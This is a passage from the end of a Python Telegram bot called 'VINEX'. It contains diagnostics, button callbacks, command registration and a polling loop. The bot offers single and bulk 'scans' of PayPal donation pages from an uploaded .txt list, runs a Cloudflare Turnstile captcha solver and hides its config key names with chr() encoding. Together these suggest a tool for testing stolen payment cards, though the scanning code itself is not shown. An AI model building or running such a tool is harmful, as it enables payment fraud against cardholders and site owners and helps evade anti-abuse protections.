            f'{vt("Currency", f"<code>{cfg.get(chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121), chr(63))}</code>")}\n'
            f'{vt("Minimum", f"<code>{cfg.get(chr(109)+chr(105)+chr(110)+chr(105)+chr(109)+chr(117)+chr(109), chr(63))}</code>")}\n'
            f'{vt("Fields", f"<code>{len(cfg.get(chr(102)+chr(111)+chr(114)+chr(109)+chr(95)+chr(102)+chr(105)+chr(101)+chr(108)+chr(100)+chr(115)) or {})}</code>")}\n'
            f'{vt("Terms", f"<code>{len(cfg.get(chr(116)+chr(101)+chr(114)+chr(109)+chr(115)+chr(95)+chr(102)+chr(105)+chr(101)+chr(108)+chr(100)+chr(115)) or [])}</code>")}\n'
            f'{vt("Hidden", f"<code>{len(cfg.get(chr(104)+chr(105)+chr(100)+chr(100)+chr(101)+chr(110)+chr(95)+chr(102)+chr(105)+chr(101)+chr(108)+chr(100)+chr(115)) or {})}</code>")}\n'
            f'{vt("Steps", f"<code>{steps_s}</code>")}\n'
            f'{vt("Prices", f"<code>{len(cfg.get(chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(95)+chr(108)+chr(101)+chr(118)+chr(101)+chr(108)+chr(115)) or [])} levels</code>")}\n'
            f'{vt("Token", f"<code>{chr(89)+chr(69)+chr(83) if cfg.get(chr(97)+chr(99)+chr(99)+chr(101)+chr(115)+chr(115)+chr(95)+chr(116)+chr(111)+chr(107)+chr(101)+chr(110)) else chr(78)+chr(79)}</code>")}\n'
            f'{vt("Auth", f"<code>{cfg.get(chr(97)+chr(117)+chr(116)+chr(104)+chr(95)+chr(109)+chr(101)+chr(116)+chr(104)+chr(111)+chr(100), chr(45))}</code>")}\n'
            f'{vt("Cloudflare", cf_info)}'
        )
        safe_edit_message(message.chat.id, msg.message_id, report)
    except Exception: log.exception('cmd_diag')


# ═══════════════════════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == 'stats')
def cb_stats(call):
    try: bot.answer_callback_query(call.id, '📊'); cmd_stats(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'help')
def cb_help(call):
    try: bot.answer_callback_query(call.id); cmd_help(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'stop')
def cb_stop(call):
    try: bot.answer_callback_query(call.id, '🛑'); cmd_stop(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'luck')
def cb_luck(call):
    try: bot.answer_callback_query(call.id, '🎲'); cmd_luck(call.message)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_paypal')
def cb_howto_paypal(call):
    try:
        bot.answer_callback_query(call.id, '💡')
        safe_send_message(call.message.chat.id,
            f'[⚡] {SB("Ready")}\n\nType:\n<code>/paypal https://your-site.com/donate</code>',
            effect=EFFECT_HEART)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_mass')
def cb_howto_mass(call):
    try:
        bot.answer_callback_query(call.id, '📦')
        safe_send_message(call.message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n\n1. /mass\n2. Upload .txt\n3. Watch 🚀',
            effect=EFFECT_THUMBS)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == 'emojis')
def cb_emojis(call):
    try:
        bot.answer_callback_query(call.id, '🎨')
        groups = {
            'Money': ['cash', 'moneybag', 'moneywings', 'money2'],
            'Status': ['warn', 'stop', 'ban', 'shield', 'blue_bolt', 'rocket'],
            'Fun': ['party', 'gift', 'laugh', 'smile', 'scream', 'grimace'],
            'UI': ['play', 'pause', 'record', 'sound', 'gear', 'circle'],
            'Misc': ['shop', 'soon', 'globe'],
        }
        lines = [f'[⚡] {B(g)}:\n' + ' '.join(ve(k) for k in keys) for g, keys in groups.items()]
        text = (f'[⚡] {SB("Vinex Emoji Pack")} {ve("party")}\n{vsep()}\n'
                + '\n\n'.join(lines) +
                f'\n{vsep()}\n{vt("Count", f"<code>{len(VINEX_CE)}</code>")}')
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(call.message.chat.id, text, reply_markup=kb, effect=EFFECT_FIRE)
    except Exception: log.exception('cb_emojis')

@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
def cb_back_start(call):
    try:
        bot.answer_callback_query(call.id)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception: pass
        cmd_start(call.message)
    except Exception: pass


# ═══════════════════════════════════════════════════════════════
#  SETUP + MAIN
# ═══════════════════════════════════════════════════════════════
def vinex_setup():
    try:
        bot.set_my_commands([
            types.BotCommand('start', '🌟 Menu'),
            types.BotCommand('paypal', '⚡ Single scan'),
            types.BotCommand('mass', '📦 Bulk scan'),
            types.BotCommand('resume', '♻️ Resume'),
            types.BotCommand('stop', '🛑 Stop'),
            types.BotCommand('stats', '📊 Stats'),
            types.BotCommand('luck', '🎲 Roll dice'),
            types.BotCommand('mood', '🎭 Random emoji'),
            types.BotCommand('diag', '🔬 Diagnostics'),
            types.BotCommand('help', '💡 Guide'),
            types.BotCommand('ping', '🏓 Health'),
        ])
    except Exception as e: log.warning(f'commands: {e}')
    try:
        bot.set_chat_menu_button(menu_button=types.MenuButtonCommands(type='commands'))
    except Exception: pass

if __name__ == '__main__':
    log.info('VINEX v26.0 FINAL starting...')
    print(r'''
    __  ___  _  __ ______ _  __
   / / / _ \/ |/ // __/ / |/ /
  / /_/ // /    // _/ /    /
 /___/_//_/_/|_/___/_/_/|_/
    v26.0 FINAL — Smart Edition
    ''')
    try: cleanup_old_files()
    except Exception: pass
    vinex_setup()
    if _turnstile.enabled:
        log.info(f'Turnstile solver enabled: {TS_API_URL}')
    else:
        log.info('Turnstile solver disabled')
    while True:
        try:
            log.info('Polling loop starting...')
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                  skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt:
            log.info('Manual shutdown.')
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'Polling crash: {str(e)[:200]}')
            if '429' in err or 'too many' in err:
                try: wait = int(err.split('retry after ')[1].split()[0])
                except Exception: wait = 30
                time.sleep(wait)
            elif '502' in err or 'bad gateway' in err:
                time.sleep(20)
            else:
                time.sleep(15)
